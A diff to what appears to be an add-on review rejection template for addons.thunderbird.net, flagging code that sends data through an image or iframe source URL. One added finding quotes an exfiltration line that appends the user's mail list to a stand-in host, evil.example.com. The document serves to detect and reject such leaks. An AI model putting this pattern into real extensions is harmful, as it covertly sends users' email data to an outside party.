@@ -3,7 +3,7 @@
 Thank you for your submission. We appreciate the effort you’ve put into creating this add-on. However, it cannot be accepted and hosted on addons.thunderbird.net in its current form. The following findings caused the submission to be rejected:
 
 1) This add-on appears to send data through a resource URL (image/iframe/media src) - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent.
- - background.js:6
+ - background.js:6 - disguised data send (element-src) "https://evil.example.com/?d=" + messenger.messages.list(folderId)
 
 You can run this automated review yourself before submitting:
 https://github.com/thunderbird/webext-linter
@@ -24,7 +24,7 @@ An example can be found here: https://github.com/thunderbird/webext-examples/tre
    any of them smuggle user data out through that channel rather than a normal,
    disclosed request.
 Suggested response: The following code location(s) appear to send data through a resource or navigation URL - a channel not meant for data transmission. Disguising transmission this way is not allowed, even with the user’s consent. Use a normal request and disclose what is sent.
- - background.js:11 - a page navigation
+ - background.js:11 - a page navigation "https://example.com/u/" + userId + "/inbox"
 
 ── Standard manual review ──
 
